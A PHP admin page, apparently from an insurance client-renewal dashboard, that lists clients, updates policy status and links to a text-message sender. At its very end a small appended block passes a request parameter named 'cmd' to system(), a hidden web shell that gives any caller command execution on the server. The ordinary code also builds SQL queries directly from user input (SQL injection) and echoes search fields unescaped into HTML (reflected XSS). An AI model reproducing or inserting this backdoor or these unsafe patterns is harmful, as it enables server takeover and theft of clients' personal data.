<?php
/*
echo '<br> myadmin' . $_SESSION["myadmin"];
echo '<br> mycomputer' . $_SESSION["mycomputer"];
echo '<br> myservice' . $_SESSION["myservice"];
echo '<br> mymarketing' . $_SESSION["mymarketing"];
echo '<br> myinsurance' . $_SESSION["myinsurance"];
*/

	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		if ($_SESSION['myadmin'] == 'Y')
			$myadmin = $_SESSION['myadmin'];		
	if(isset($_SESSION['myinsurance']))
		if ($_SESSION['myinsurance'] == 'Y')
			$myadmin = $_SESSION['myinsurance'];	


	$mystatus = '';	
	if(isset($_POST['mystatus']))
	{
		if ($_POST['mystatus'])
		{
			$mystatus = $_POST['mystatus'];
		}
	}
	if(isset($_GET['mystatus']))
	{
		if ($_GET['mystatus'])
		{
			$mystatus = $_GET['mystatus'];
		}
	}
	//echo '<br> mystatus : ' . $mystatus;
	
	$mybox = '';
	if(isset($_POST['mybox']))
	{
		if ($_POST['mybox'])
		{
			$mybox = $_POST['mybox'];
		}
	}
	if(isset($_GET['mybox']))
	{
		if ($_GET['mybox'])
		{
			$mybox = $_GET['mybox'];
		}
	}
	//echo '<br> mybox : ' . $mybox;
	
	if ($mybox != 'add')
	{
		$myadmin = 'N';
	}	
		

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		$insurance_user = $_SESSION["ulname"];
		$insurance_stamp = $globaldatetime;

	
		$mytag = '';	
		$mytag = $_POST["mytag"];	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
				
		$search_code = '';
		$search_code = $_POST["search_code"];	
		if(isset($_GET['search_code']))
		{
			if ($_GET['search_code'])
			{
				$search_code = $_GET['search_code'];
			}
		}	

		$search_name = '';
		$search_name = $_POST["search_name"];	
		if(isset($_GET['search_name']))
		{
			if ($_GET['search_name'])
			{
				$search_name = $_GET['search_name'];
			}
		}	
		
		$search_mobile = '';
		$search_mobile = $_POST["search_mobile"];	
		if(isset($_GET['search_mobile']))
		{
			if ($_GET['search_mobile'])
			{
				$search_mobile = $_GET['search_mobile'];
			}
		}		
		
		if ($mystatus == 'sent')
		{	
			$insurance_id = $_POST['insurance_id'];
			$insurance_status = $_POST['insurance_status'];
				
			//update the status 
			$query_update = 
				"UPDATE 
					insurance_list 
				SET 
					insurance_status = '$insurance_status',
					insurance_user = '$insurance_user',
					insurance_stamp = '$insurance_stamp'					
				WHERE
					insurance_id = '$insurance_id' ";
			mysql_query($query_update) or die(mysql_error());   		
		}

?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Insurance Dashboard - Client List for Today (<?php echo date("m/d/y", strtotime($globaldate)); ?>)</h1>
<?php
	//echo '<br> insurance_id : ' . $insurance_id;
	//echo '<br> insurance_status : ' . $insurance_status;
?>
                </div>
                <!-- /.col-lg-12 -->
            </div>

            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">


							<table width="100%">
								<tr>
									<td align="left">
<form method="post" action="index.php?body=insurance_send_screen&mybox=add">
Filter Code
<INPUT TYPE="TEXT" NAME="search_code" VALUE="<?php print($search_code); ?>" SIZE="15" MAXLENGTH="20">
&nbsp;&nbsp;&nbsp;
Filter Name
<INPUT TYPE="TEXT" NAME="search_name" VALUE="<?php print($search_name); ?>" SIZE="25" MAXLENGTH="50">
&nbsp;&nbsp;&nbsp;
Filter Mobile
<INPUT TYPE="TEXT" NAME="search_mobile" VALUE="<?php print($search_mobile); ?>" SIZE="25" MAXLENGTH="50">
&nbsp;&nbsp;&nbsp;
<input type="submit" value="Filter" />
</form>									
									</td>
								</tr>

								<tr>
									<td align="left">
Note : If the status is Renew or Cancel, the client's name will not appear anymore
									</td>
								</tr>
							</table>	
                        </div>
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th>#</th>
										<th>Date to Send</th>
										<th>Customer Code / Name </th>
										<th>Mobile No. / Type</th>
										<th>Status</th>
										<th>Action</th>
										<th>Active</th>
                                    </tr>
                                </thead>
                                <tbody>
								
<?php
	$querydb  = "SELECT 
				 a.* 
			   FROM 
				 insurance_list a
			   WHERE
			   	 a.insurance_send <= '$globaldate' and
				 a.insurance_status <> 'Renew'  and
				 a.insurance_status <> 'Cancel'  and
				 a.cucode LIKE '%$search_code%'  and
				 a.cuname LIKE '%$search_name%'  and
				 a.insurance_mobile LIKE '%$search_mobile%' and
				 a.insurance_active = 'Y'
			   ORDER BY 
				 a.insurance_send, a.cuname";
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;
	
	//fetch the results from the database
	$countdb = $countdb + 1;
	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr class=\"odd gradeX\">");
	
		print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
		print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb['insurance_send'])). "</td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[cucode] <br> $rowdb[cuname] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[insurance_mobile] <br> $rowdb[insurance_type] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[insurance_status] </td>\n");
	
		print("<td align=\"CENTER\" valign=\"middle\">");
?>		
<form name="update_status" role="form" method="post" action="index.php?body=insurance_send_screen&mybox=add" onsubmit="return confirm('Once you choose RENEW or CANCEL, the entry will not be seen anymore. Are you sure you want to update?');">
		<select class="form-control" name='insurance_status'>
			<option></option>	
			<option>Open</option>
			<option>Reminder</option>	
			<option>Overdue</option>	
			<option>Renew</option>	
			<option>Cancel</option>	
			<option></option>	
		</select>		
	<input type="hidden" name="mystatus" value="sent" />
	<input type="hidden" name="insurance_id" value="<?php print ($rowdb['insurance_id']); ?>" />
	<input type="hidden" name="search_code" value="<?php print ("$search_code"); ?>" />
	<input type="hidden" name="search_name" value="<?php print ("$search_name"); ?>" />
	<input type="hidden" name="search_mobile" value="<?php print ("$search_mobile"); ?>" />
	<button type="submit" class="btn btn-default">Update Status</button>
</form>			
<?php		
		print("</td>");

		print("	<td align=\"CENTER\" valign=\"middle\">");
?>
<form name="send_text" role="form" method="post" action="index.php?body=send_message_solo&mybox=add&mybox=add" target="_blank">
	<input type="hidden" name="cucode" value="<?php print ($rowdb['cucode']); ?>" />
	<input type="hidden" name="search_code" value="<?php print ("$search_code"); ?>" />
	<input type="hidden" name="search_name" value="<?php print ("$search_name"); ?>" />
	<input type="hidden" name="search_mobile" value="<?php print ("$search_mobile"); ?>" />
	<button type="submit" class="btn btn-default">Send Text <br> Message</button>
</form>	
<?php
		print("</td>");
	
		print("</tr>");  
		$countdb = $countdb + 1;
	}  
?>		

                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->									
        </div>
        <!-- /#page-wrapper -->
<?php
	}
?>			<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>